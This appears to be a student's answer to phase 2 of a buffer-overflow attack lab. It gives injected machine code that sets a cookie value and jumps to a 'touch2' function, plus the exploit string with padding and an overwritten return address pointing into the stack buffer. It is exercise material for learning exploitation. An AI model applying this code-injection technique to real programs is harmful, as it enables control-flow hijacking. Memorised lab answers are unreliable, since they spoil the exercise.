
phase_2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   

answer:
48 c7 c7 fa 97 b9 59  /* mov    $0x59b997fa,%rdi, number */
68 ec 17 40 00      /* pushq  $0x4017ec, addr of touch2 func*/
c3                   /* retq */
61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 
/* 27 bytes of padding */
78 dc 61 55 00 00 00 00  /* overwrite ret addr to test; false return addr to buf */